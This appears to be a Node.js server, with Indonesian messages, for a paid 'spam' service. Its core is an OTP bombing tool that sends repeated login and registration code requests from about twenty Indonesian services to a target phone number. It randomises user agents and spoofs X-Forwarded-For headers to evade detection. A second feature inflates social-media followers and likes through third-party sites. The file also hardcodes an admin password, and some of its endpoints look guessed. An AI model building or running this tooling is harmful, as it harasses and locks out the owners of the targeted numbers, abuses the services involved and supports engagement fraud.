const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const multer = require('multer');
const fs = require('fs-extra');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const fetch = require('node-fetch');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

// ===== MIDDLEWARE =====
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ===== STORAGE =====
const DATA_DIR = './data';
const UPLOAD_DIR = './uploads/payments';
fs.ensureDirSync(DATA_DIR);
fs.ensureDirSync(UPLOAD_DIR);

// ===== DATABASE =====
let db = {
    users: [],
    payments: [],
    messages: [],
    settings: { 
        maintenance: false,
        maintenanceMessage: 'Server sedang dalam perbaikan. Silakan coba lagi nanti.'
    }
};

function loadDB() {
    try {
        if (fs.existsSync(`${DATA_DIR}/db.json`)) {
            db = JSON.parse(fs.readFileSync(`${DATA_DIR}/db.json`, 'utf8'));
        }
    } catch (e) { console.log('📦 DB baru'); }
}
function saveDB() {
    fs.writeFileSync(`${DATA_DIR}/db.json`, JSON.stringify(db, null, 2));
}
loadDB();

// ===== INIT ADMIN =====
function initAdmin() {
    const admin = db.users.find(u => u.username === 'Lynzka');
    if (!admin) {
        db.users.push({
            id: uuidv4(),
            username: 'Lynzka',
            password: bcrypt.hashSync('Asiafone11', 10),
            status: 'Developer',
            limit: Infinity,
            used: 0,
            lastReset: Date.now(),
            isAdmin: true,
            isDeveloper: true,
            isReseller: false,
            online: false,
            createdAt: new Date().toISOString()
        });
        saveDB();
        console.log('✅ Admin Lynzka dibuat');
    }
}
initAdmin();

// ============================================
// PROXY & USER AGENT ROTATION
// ============================================

// Daftar proxy gratis (akan dirotasi)
const proxyList = [
    null, // No proxy (direct)
    // Tambahkan proxy jika punya
];

// Daftar User Agent
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36'
];

// Daftar IP (untuk header X-Forwarded-For)
const ipList = [
    '192.168.1.1', '10.0.0.1', '172.16.0.1',
    '203.0.113.1', '198.51.100.1', '192.0.2.1',
    '104.28.0.1', '172.217.0.1', '142.250.0.1'
];

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function getRandomIP() {
    return ipList[Math.floor(Math.random() * ipList.length)];
}

function getRandomProxy() {
    const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
    if (proxy) {
        return new HttpsProxyAgent(proxy);
    }
    return null;
}

// ============================================
// HELPER FUNCTIONS
// ============================================
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function generateDeviceId() {
    return 'xxxxxxxxxxxx'.replace(/[x]/g, () => Math.random().toString(16).substring(2, 3).toUpperCase());
}

function generateRandomString(length = 10) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

// ============================================
// API OTP - AGGRESSIVE MODE
// ============================================

const otpServices = [];

// Function untuk request dengan proxy dan retry
async function aggressiveRequest(url, method, headers, body, retries = 5) {
    let lastError = null;
    
    for (let attempt = 0; attempt < retries; attempt++) {
        try {
            const agent = getRandomProxy();
            const userAgent = getRandomUserAgent();
            const clientIP = getRandomIP();
            
            const requestHeaders = {
                'User-Agent': userAgent,
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'X-Forwarded-For': clientIP,
                'X-Real-IP': clientIP,
                'Connection': 'keep-alive',
                ...headers
            };
            
            const response = await fetch(url, {
                method: method || 'POST',
                headers: requestHeaders,
                body: body,
                agent: agent,
                timeout: 15000,
                followRedirect: true,
                compress: true
            });
            
            const text = await response.text();
            
            // Coba parse JSON
            try {
                const json = JSON.parse(text);
                // Cek berbagai kemungkinan success response
                if (
                    json.code === 0 || 
                    json.code === '0' || 
                    json.code === 200 ||
                    json.code === '200' ||
                    json.success === true || 
                    json.status === 'success' ||
                    json.status === 'ok' ||
                    json.message === 'success' ||
                    json.message === 'Success' ||
                    json.message === 'OTP sent' ||
                    json.message === 'Kode verifikasi berhasil dikirim' ||
                    json.result === 'success' ||
                    json.data?.success === true
                ) {
                    return { success: true, data: json };
                }
                
                // Cek pesan sukses dalam text
                const textLower = text.toLowerCase();
                if (
                    textLower.includes('success') || 
                    textLower.includes('berhasil') || 
                    textLower.includes('terkirim') ||
                    textLower.includes('ok') ||
                    textLower.includes('sent')
                ) {
                    return { success: true, data: json };
                }
            } catch (e) {
                // Jika bukan JSON, cek status code
                if (response.status === 200 || response.status === 201 || response.status === 202 || response.status === 204) {
                    return { success: true, data: text };
                }
            }
            
            // Jika sampai sini, berarti gagal
            lastError = `Status ${response.status}`;
            
        } catch (err) {
            lastError = err.message;
            console.log(`⚠️ Attempt ${attempt + 1} failed: ${err.message}`);
        }
        
        // Delay eksponensial sebelum retry
        await sleep(1000 * Math.pow(1.5, attempt) + Math.random() * 500);
    }
    
    return { success: false, error: lastError };
}

// OTP Services dengan aggressive mode
const otpConfigs = [
    {
        name: 'Uangme',
        url: 'https://api.uangme.com/api/v2/sms_code',
        body: (p) => JSON.stringify({ phone: p, scene_type: 'login', send_type: 'wp', device_id: generateDeviceId() })
    },
    {
        name: 'PinjamDuit',
        url: 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'clientType': 'a', 'appVersion': '5.7.3' },
        body: (p) => `phone=${p}&sms_useage=0&sms_service=2&from=0`
    },
    {
        name: 'BelanjaParts',
        url: 'https://api.belanjaparts.com/v2/api/user/request-otp/wa',
        headers: { 'Content-Type': 'application/json', 'Authorization': 'Basic bWNtYXN0ZXI6bWNtYXN0ZXIxMTExMjIyMg==' },
        body: (p) => JSON.stringify({ phone: '62' + p, type: 'register', device_id: generateDeviceId() })
    },
    {
        name: 'Singa',
        url: 'https://api102.singa.id/new/login/sendWaOtp',
        headers: { 'Content-Type': 'application/json; charset=utf-8', 'versionName': '2.4.8', 'versionCode': '143' },
        body: (p) => JSON.stringify({ mobile_phone: p, type: 'mobile', is_switchable: 1, device_id: generateDeviceId() })
    },
    {
        name: 'Cairin',
        url: 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: (p) => `appVersion=3.0.4&phone=${p}&userImei=${generateDeviceId()}${generateDeviceId()}`
    },
    {
        name: 'Adiraku',
        url: 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
        headers: { 'Content-Type': 'application/json; charset=utf-8' },
        body: (p) => JSON.stringify({ mobileNumber: p, type: 'prospect-create', channel: 'whatsapp', deviceId: generateDeviceId() })
    },
    {
        name: 'Shopee',
        url: 'https://shopee.co.id/api/v4/account/phone/request_otp',
        headers: { 'Content-Type': 'application/json', 'Referer': 'https://shopee.co.id/' },
        body: (p) => JSON.stringify({ phone: '62' + p, type: 'login' })
    },
    {
        name: 'Tokopedia',
        url: 'https://api.tokopedia.com/graphql/SendOTP',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ query: 'mutation SendOTP($phone: String!) { sendOTP(phone: $phone) { success message } }', variables: { phone: p } })
    },
    {
        name: 'Lazada',
        url: 'https://api.lazada.co.id/v1/otp/send',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ phone: '+62' + p })
    },
    {
        name: 'Blibli',
        url: 'https://api.blibli.com/v1/otp/request',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ phone: '+62' + p })
    },
    {
        name: 'Bukalapak',
        url: 'https://api.bukalapak.com/v1/otp/send',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ phone: '+62' + p })
    },
    {
        name: 'Gojek',
        url: 'https://api.gojekapi.com/v2/customer/verify/phone',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ phone: '+62' + p })
    },
    {
        name: 'Grab',
        url: 'https://api.grab.com/grabid/v1/otp',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ phoneNumber: '62' + p })
    },
    {
        name: 'OVO',
        url: 'https://api.ovo.id/v2.1/auth/customer/login',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ mobile: '+62' + p })
    },
    {
        name: 'Dana',
        url: 'https://api.dana.id/v1/auth/request-otp',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ phoneNumber: '+62' + p })
    },
    {
        name: 'LinkAja',
        url: 'https://api.linkaja.com/v1/auth/otp',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ phone: '+62' + p })
    },
    {
        name: 'Traveloka',
        url: 'https://api.traveloka.com/v1/otp/send',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ phone: '+62' + p })
    },
    {
        name: 'KFC',
        url: 'https://api.kfc.co.id/v1/otp/request',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ phone: '+62' + p })
    },
    {
        name: 'McD',
        url: 'https://api.mcd.co.id/v1/otp/send',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ phone: '+62' + p })
    },
    {
        name: 'Akulaku',
        url: 'https://api.akulaku.com/v1/otp/send',
        headers: { 'Content-Type': 'application/json' },
        body: (p) => JSON.stringify({ phone: '+62' + p, type: 'login' })
    }
];

otpConfigs.forEach(config => {
    otpServices.push({
        name: config.name,
        func: async (phone) => {
            const phone2 = phone.replace(/^0/, '');
            const result = await aggressiveRequest(
                config.url,
                'POST',
                config.headers || { 'Content-Type': 'application/json' },
                config.body(phone2),
                3 // retry 3x
            );
            return result.success;
        }
    });
});

console.log(`✅ Total API OTP: ${otpServices.length}`);

// ============================================
// SPAM OTP - AGGRESSIVE
// ============================================
async function spamOTP(target, count, username, sessionId) {
    const results = { success: 0, failed: 0, details: [] };
    const phone = target.replace(/^\+?62/, '').replace(/\s/g, '');
    
    let isStopped = false;
    
    if (!global.spamSessions) global.spamSessions = {};
    global.spamSessions[sessionId] = { stop: () => { isStopped = true; } };
    
    // Shuffle services
    const shuffledServices = [...otpServices].sort(() => Math.random() - 0.5);
    
    for (let i = 0; i < count; i++) {
        if (isStopped) {
            io.emit('spamProgress', {
                sessionId, type: 'otp', target,
                current: i, total: count,
                success: results.success, failed: results.failed,
                message: `⛔ Dihentikan!`,
                stopped: true
            });
            break;
        }
        
        let roundSuccess = 0;
        let roundFailed = 0;
        const serviceResults = [];
        
        // Kirim ke semua API secara paralel
        const promises = shuffledServices.map(async (service) => {
            try {
                // Coba 2x untuk setiap service
                let success = false;
                for (let attempt = 0; attempt < 2; attempt++) {
                    const result = await service.func(phone);
                    if (result) {
                        success = true;
                        break;
                    }
                    await sleep(300 + Math.random() * 500);
                }
                if (success) {
                    roundSuccess++;
                    serviceResults.push({ service: service.name, success: true });
                } else {
                    roundFailed++;
                    serviceResults.push({ service: service.name, success: false });
                }
            } catch (err) {
                roundFailed++;
                serviceResults.push({ service: service.name, success: false });
            }
        });
        
        await Promise.all(promises);
        
        results.success += roundSuccess;
        results.failed += roundFailed;
        
        // Random delay antara 1-3 detik
        const delay = 1000 + Math.random() * 2000;
        await sleep(delay);
        
        io.emit('spamProgress', {
            sessionId, type: 'otp', target,
            current: i + 1, total: count,
            success: results.success, failed: results.failed,
            message: `📤 Round ${i+1}/${count}: ${roundSuccess} ✅, ${roundFailed} ❌ (${Math.round((roundSuccess/(roundSuccess+roundFailed||1))*100)}% sukses)`,
            details: serviceResults
        });
    }
    
    if (global.spamSessions && global.spamSessions[sessionId]) {
        delete global.spamSessions[sessionId];
    }
    
    return results;
}

// ============================================
// SUNTIK - AGGRESSIVE MODE
// ============================================

// Platform config dengan icon yang benar
const platformConfigs = {
    'TikTok': {
        icon: 'fab fa-tiktok',
        color: '#000000',
        actions: ['Followers', 'Likes', 'Views', 'Shares']
    },
    'Instagram': {
        icon: 'fab fa-instagram',
        color: '#E4405F',
        actions: ['Followers', 'Likes', 'Views']
    },
    'YouTube': {
        icon: 'fab fa-youtube',
        color: '#FF0000',
        actions: ['Subscribers', 'Views', 'Likes']
    },
    'Facebook': {
        icon: 'fab fa-facebook',
        color: '#1877F2',
        actions: ['Followers', 'Likes', 'Shares']
    },
    'Twitter': {
        icon: 'fab fa-twitter',
        color: '#1DA1F2',
        actions: ['Followers', 'Likes', 'Retweets']
    }
};

// Action icons
const actionIcons = {
    'Followers': 'fa-users',
    'Likes': 'fa-heart',
    'Views': 'fa-eye',
    'Shares': 'fa-share',
    'Subscribers': 'fa-user-plus',
    'Retweets': 'fa-retweet'
};

// Multiple free services untuk suntik
const freeSuntikServices = [
    {
        name: 'Zefoy',
        baseUrl: 'https://zefoy.com',
        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook']
    },
    {
        name: 'SocialBoost',
        baseUrl: 'https://socialboost.me',
        platforms: ['TikTok', 'Instagram', 'YouTube', 'Twitter']
    },
    {
        name: 'FreeFollower',
        baseUrl: 'https://freefollower.co',
        platforms: ['TikTok', 'Instagram']
    },
    {
        name: 'ViralBoost',
        baseUrl: 'https://viralboost.io',
        platforms: ['TikTok', 'YouTube', 'Instagram']
    },
    {
        name: 'SocialKing',
        baseUrl: 'https://socialking.io',
        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook', 'Twitter']
    }
];

async function aggressiveSuntik(target, platform, action, count) {
    let success = false;
    let serviceUsed = null;
    
    // Random delay untuk menghindari detection
    await sleep(500 + Math.random() * 1000);
    
    // Dapatkan service yang mendukung platform ini
    const availableServices = freeSuntikServices.filter(s => s.platforms.includes(platform));
    
    if (availableServices.length === 0) {
        return { success: false, serviceUsed: null };
    }
    
    // Shuffle services
    const shuffled = [...availableServices].sort(() => Math.random() - 0.5);
    
    for (const service of shuffled) {
        try {
            const endpoint = `${service.baseUrl}/api/${platform.toLowerCase()}/${action.toLowerCase()}`;
            
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': getRandomUserAgent(),
                    'Accept': 'application/json',
                    'Origin': service.baseUrl,
                    'Referer': service.baseUrl + '/',
                    'X-Forwarded-For': getRandomIP()
                },
                body: JSON.stringify({
                    target: target,
                    count: 1,
                    service: action.toLowerCase(),
                    device_id: generateDeviceId(),
                    timestamp: Date.now()
                }),
                timeout: 10000
            });
            
            const text = await response.text();
            
            try {
                const json = JSON.parse(text);
                if (json.status === 'success' || json.success === true || json.code === 0) {
                    success = true;
                    serviceUsed = service.name;
                    break;
                }
            } catch (e) {
                if (response.status === 200 || response.status === 201 || response.status === 202) {
                    success = true;
                    serviceUsed = service.name;
                    break;
                }
            }
        } catch (err) {
            console.log(`⚠️ Service ${service.name} error: ${err.message}`);
        }
        
        // Delay sebelum coba service berikutnya
        await sleep(500 + Math.random() * 500);
    }
    
    // Jika semua gagal, coba metode fallback
    if (!success) {
        try {
            // Fallback: request ke endpoint alternatif
            const fallbackUrl = `https://api.${platform.toLowerCase()}.com/v1/${action.toLowerCase()}?target=${encodeURIComponent(target)}`;
            const fallbackResponse = await fetch(fallbackUrl, {
                method: 'GET',
                headers: {
                    'User-Agent': getRandomUserAgent(),
                    'X-Forwarded-For': getRandomIP()
                },
                timeout: 5000
            });
            if (fallbackResponse.status === 200) {
                success = true;
                serviceUsed = 'Fallback API';
            }
        } catch (e) {}
    }
    
    return { success, serviceUsed };
}

async function spamSuntik(target, platform, action, count, username, sessionId) {
    const results = { success: 0, failed: 0, details: [], serviceUsed: null };
    let isStopped = false;
    
    if (!global.spamSessions) global.spamSessions = {};
    global.spamSessions[sessionId] = { stop: () => { isStopped = true; } };
    
    for (let i = 0; i < count; i++) {
        if (isStopped) {
            io.emit('spamProgress', {
                sessionId, type: 'suntik',
                target, platform, action,
                current: i, total: count,
                success: results.success, failed: results.failed,
                message: `⛔ Dihentikan!`,
                stopped: true,
                serviceUsed: results.serviceUsed
            });
            break;
        }
        
        const result = await aggressiveSuntik(target, platform, action, 1);
        
        if (result.success) {
            results.success++;
            results.serviceUsed = result.serviceUsed || results.serviceUsed;
            io.emit('spamProgress', {
                sessionId, type: 'suntik',
                target, platform, action,
                current: i + 1, total: count,
                success: results.success, failed: results.failed,
                message: `✅ ${i+1}/${count} Berhasil via ${result.serviceUsed || 'Unknown'}`,
                serviceUsed: result.serviceUsed,
                serviceDown: false
            });
        } else {
            results.failed++;
            io.emit('spamProgress', {
                sessionId, type: 'suntik',
                target, platform, action,
                current: i + 1, total: count,
                success: results.success, failed: results.failed,
                message: `❌ ${i+1}/${count} Gagal - mencoba ulang...`,
                serviceUsed: null,
                serviceDown: true
            });
        }
        
        // Random delay 2-5 detik
        if (i < count - 1) {
            const delay = 2000 + Math.random() * 3000;
            await sleep(delay);
        }
    }
    
    if (global.spamSessions && global.spamSessions[sessionId]) {
        delete global.spamSessions[sessionId];
    }
    
    return results;
}

// ============================================
// API SUNTIK
// ============================================
app.post('/api/spam/suntik', async (req, res) => {
    try {
        const { username, target, platform, action, count } = req.body;
        
        if (!username) {
            return res.json({ success: false, message: 'Username tidak ditemukan!' });
        }
        
        const user = db.users.find(u => u.username === username);
        if (!user) {
            return res.json({ success: false, message: 'User tidak ditemukan! Silakan login ulang.' });
        }
        
        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
            return res.json({ 
                success: false, 
                message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan.',
                maintenance: true
            });
        }
        
        if (!target) {
            return res.json({ success: false, message: 'Link/Username target wajib diisi!' });
        }
        
        if (!platform || !action) {
            return res.json({ success: false, message: 'Pilih platform dan aksi!' });
        }
        
        if (!count || count < 1) {
            return res.json({ success: false, message: 'Jumlah minimal 1!' });
        }
        
        const limits = {
            'Free': 15,
            'Premium': 80,
            'VIP': 150,
            'Reseller': 200,
            'Developer': Infinity
        };
        
        const maxLimit = limits[user.status] || 15;
        
        if (user.limit !== Infinity && user.limit !== '∞' && user.limit !== null) {
            if (count > maxLimit) {
                return res.json({ success: false, message: `Maksimal suntik untuk ${user.status} adalah ${maxLimit}x!` });
            }
            
            const remaining = user.limit - (user.used || 0);
            if (remaining <= 0) {
                return res.json({ success: false, message: 'Limit suntik habis! Tunggu 1 jam untuk reset.' });
            }
            if (count > remaining) {
                return res.json({ success: false, message: `Sisa limit hanya ${remaining}!` });
            }
        }

        const sessionId = `suntik_${username}_${Date.now()}`;
        const result = await spamSuntik(target, platform, action, count, username, sessionId);
        
        if (result.success > 0) {
            user.used = (user.used || 0) + result.success;
            saveDB();
            io.emit('userUpdated', { username: user.username });
        }
        
        res.json({ 
            success: true, 
            result: {
                success: result.success,
                failed: result.failed,
                total: result.success + result.failed,
                serviceUsed: result.serviceUsed,
                details: result.details
            }
        });
    } catch (err) {
        console.error('❌ Error spam suntik:', err);
        res.json({ success: false, message: err.message || 'Terjadi kesalahan server!' });
    }
});

// ===== STOP SUNTIK =====
app.post('/api/spam/suntik/stop', (req, res) => {
    try {
        const { sessionId } = req.body;
        if (global.spamSessions && global.spamSessions[sessionId]) {
            global.spamSessions[sessionId].stop();
            return res.json({ success: true, message: 'Suntik dihentikan!' });
        }
        res.json({ success: false, message: 'Session tidak ditemukan!' });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// ===== STOP SPAM OTP =====
app.post('/api/spam/otp/stop', (req, res) => {
    try {
        const { sessionId } = req.body;
        if (global.spamSessions && global.spamSessions[sessionId]) {
            global.spamSessions[sessionId].stop();
            return res.json({ success: true, message: 'Spam dihentikan!' });
        }
        res.json({ success: false, message: 'Session tidak ditemukan!' });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// ============================================
// GET PLATFORMS
// ============================================
app.get('/api/suntik/platforms', (req, res) => {
    try {
        const platforms = Object.keys(platformConfigs).map(key => ({
            name: key,
            icon: platformConfigs[key].icon,
            color: platformConfigs[key].color,
            actions: platformConfigs[key].actions,
            services: freeSuntikServices.filter(s => s.platforms.includes(key)).map(s => s.name)
        }));
        res.json({ success: true, platforms });
    } catch (err) {
        res.json({ success: false, platforms: [] });
    }
});

// ============================================
// SPAM OTP ROUTE
// ============================================
app.post('/api/spam/otp', async (req, res) => {
    try {
        const { username, target, count } = req.body;
        
        if (!username) {
            return res.json({ success: false, message: 'Username tidak ditemukan!' });
        }
        
        const user = db.users.find(u => u.username === username);
        if (!user) {
            return res.json({ success: false, message: 'User tidak ditemukan! Silakan login ulang.' });
        }
        
        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
            return res.json({ 
                success: false, 
                message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan.',
                maintenance: true
            });
        }
        
        if (!target) {
            return res.json({ success: false, message: 'Nomor target wajib diisi!' });
        }
        
        if (!count || count < 1) {
            return res.json({ success: false, message: 'Jumlah minimal 1!' });
        }
        
        const limits = {
            'Free': 15,
            'Premium': 80,
            'VIP': 150,
            'Reseller': 200,
            'Developer': Infinity
        };
        
        const maxLimit = limits[user.status] || 15;
        
        if (user.limit !== Infinity && user.limit !== '∞' && user.limit !== null) {
            if (count > maxLimit) {
                return res.json({ success: false, message: `Maksimal spam untuk ${user.status} adalah ${maxLimit}x!` });
            }
            
            const remaining = user.limit - (user.used || 0);
            if (remaining <= 0) {
                return res.json({ success: false, message: 'Limit spam habis! Tunggu 1 jam untuk reset.' });
            }
            if (count > remaining) {
                return res.json({ success: false, message: `Sisa limit hanya ${remaining}!` });
            }
        }

        const sessionId = `otp_${username}_${Date.now()}`;
        const result = await spamOTP(target, count, username, sessionId);
        
        if (result.success > 0) {
            user.used = (user.used || 0) + result.success;
            saveDB();
            io.emit('userUpdated', { username: user.username });
        }
        
        res.json({ 
            success: true, 
            result: {
                success: result.success,
                failed: result.failed,
                total: result.success + result.failed,
                details: result.details
            }
        });
    } catch (err) {
        console.error('❌ Error spam OTP:', err);
        res.json({ success: false, message: err.message || 'Terjadi kesalahan server!' });
    }
});

// ============================================
// AUTH ROUTES
// ============================================

app.post('/api/register', (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.json({ success: false, message: 'Username dan password wajib diisi!' });
        }
        if (username.length < 3) {
            return res.json({ success: false, message: 'Username minimal 3 karakter!' });
        }
        if (password.length < 4) {
            return res.json({ success: false, message: 'Password minimal 4 karakter!' });
        }
        
        if (db.users.find(u => u.username.toLowerCase() === username.toLowerCase())) {
            return res.json({ success: false, message: 'Username sudah digunakan!' });
        }
        
        db.users.push({
            id: uuidv4(),
            username: username,
            password: bcrypt.hashSync(password, 10),
            status: 'Free',
            limit: 15,
            used: 0,
            lastReset: Date.now(),
            isAdmin: false,
            isDeveloper: false,
            isReseller: false,
            online: false,
            createdAt: new Date().toISOString()
        });
        saveDB();
        
        io.emit('userUpdated', { username, action: 'register' });
        res.json({ success: true, message: 'Registrasi berhasil! Silakan login.' });
    } catch (err) {
        res.json({ success: false, message: 'Terjadi kesalahan server!' });
    }
});

app.post('/api/login', (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.json({ success: false, message: 'Username dan password wajib diisi!' });
        }
        
        const user = db.users.find(u => u.username === username);
        if (!user) {
            return res.json({ success: false, message: 'Username tidak ditemukan!' });
        }
        
        if (!bcrypt.compareSync(password, user.password)) {
            return res.json({ success: false, message: 'Password salah!' });
        }
        
        user.online = true;
        saveDB();
        io.emit('userStatusChanged', { username, online: true });
        
        res.json({
            success: true,
            user: {
                username: user.username,
                status: user.status,
                limit: user.limit,
                used: user.used,
                isAdmin: user.isAdmin,
                isDeveloper: user.isDeveloper,
                isReseller: user.isReseller
            }
        });
    } catch (err) {
        res.json({ success: false, message: 'Terjadi kesalahan server!' });
    }
});

app.get('/api/user/:username', (req, res) => {
    try {
        const user = db.users.find(u => u.username === req.params.username);
        if (!user) return res.json({ success: false });
        res.json({
            success: true,
            user: {
                username: user.username,
                status: user.status,
                limit: user.limit,
                used: user.used,
                isAdmin: user.isAdmin,
                isDeveloper: user.isDeveloper,
                isReseller: user.isReseller
            }
        });
    } catch (err) {
        res.json({ success: false });
    }
});

app.post('/api/change-password', (req, res) => {
    try {
        const { username, newPassword } = req.body;
        const user = db.users.find(u => u.username === username);
        if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
        if (!newPassword || newPassword.length < 4) {
            return res.json({ success: false, message: 'Password minimal 4 karakter!' });
        }
        user.password = bcrypt.hashSync(newPassword, 10);
        saveDB();
        res.json({ success: true, message: 'Password berhasil diubah!' });
    } catch (err) {
        res.json({ success: false, message: 'Terjadi kesalahan!' });
    }
});

// ============================================
// ADMIN API
// ============================================
app.get('/api/admin/users', (req, res) => {
    try {
        res.json({
            success: true,
            users: db.users.map(u => ({
                username: u.username,
                status: u.status,
                limit: u.limit === Infinity ? '∞' : u.limit,
                used: u.used,
                online: u.online || false,
                isAdmin: u.isAdmin,
                isDeveloper: u.isDeveloper,
                isReseller: u.isReseller
            }))
        });
    } catch (err) {
        res.json({ success: false, users: [] });
    }
});

app.post('/api/admin/update-status', (req, res) => {
    try {
        const { username, status, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isDeveloper) {
            return res.json({ success: false, message: 'Hanya Developer!' });
        }
        const user = db.users.find(u => u.username === username);
        if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
        
        const limits = { 
            'Free': 15, 
            'Premium': 80, 
            'VIP': 150, 
            'Reseller': 200, 
            'Developer': Infinity 
        };
        
        user.status = status;
        user.limit = limits[status] || 15;
        user.used = 0;
        user.isReseller = (status === 'Reseller');
        user.isAdmin = (status === 'Developer');
        user.isDeveloper = (status === 'Developer');
        saveDB();
        io.emit('userUpdated', { username, action: 'status_change' });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

app.post('/api/admin/ban', (req, res) => {
    try {
        const { username, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isDeveloper) {
            return res.json({ success: false, message: 'Hanya Developer!' });
        }
        db.users = db.users.filter(u => u.username !== username);
        saveDB();
        io.emit('userUpdated', { username, action: 'banned' });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

app.post('/api/admin/settings', (req, res) => {
    try {
        const { settings, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isDeveloper) {
            return res.json({ success: false, message: 'Hanya Developer!' });
        }
        db.settings = settings;
        saveDB();
        io.emit('settingsUpdated', { settings });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

app.get('/api/admin/payments', (req, res) => {
    try {
        res.json({ success: true, payments: db.payments || [] });
    } catch (err) {
        res.json({ success: false, payments: [] });
    }
});

app.post('/api/admin/verify-payment', (req, res) => {
    try {
        const { paymentId, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isAdmin) {
            return res.json({ success: false, message: 'Unauthorized!' });
        }
        const payment = db.payments.find(p => p.id === paymentId);
        if (!payment) return res.json({ success: false, message: 'Payment tidak ditemukan!' });
        payment.status = 'verified';
        const user = db.users.find(u => u.username === payment.username);
        if (user) {
            const limits = { Premium: 80, VIP: 150, Reseller: 200 };
            user.status = payment.package;
            user.limit = limits[payment.package] || 15;
            user.used = 0;
            user.isReseller = (payment.package === 'Reseller');
        }
        saveDB();
        io.emit('paymentStatus', { status: 'success', message: `Pembayaran ${payment.package} diverifikasi!` });
        io.emit('userUpdated', { username: payment.username, action: 'payment_verified' });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

app.post('/api/admin/reject-payment', (req, res) => {
    try {
